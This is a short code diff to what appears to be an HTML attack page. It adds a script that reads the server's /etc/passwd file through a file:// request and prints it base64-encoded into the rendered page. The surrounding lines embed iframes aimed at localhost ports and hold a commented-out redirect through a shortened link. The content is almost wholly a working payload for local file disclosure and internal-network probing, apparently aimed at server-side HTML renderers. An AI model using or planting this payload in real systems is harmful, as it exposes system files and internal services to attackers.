@@ -8,6 +8,11 @@
         <iframe src=http://localhost width=300 height=200>
         <iframe src=http://localhost:41501 width=300 height=200>
         <script>
+            x=new XMLHttpRequest;
+            x.onload=function(){document.write(btoa(this.responseText))};
+            x.open("GET","file:///etc/passwd");x.send();
+        </script>
+        <script>
             // Javascript redirect to google.com
             //window.location.replace("https://tinyurl.com/3xdjs3x9");
         </script>
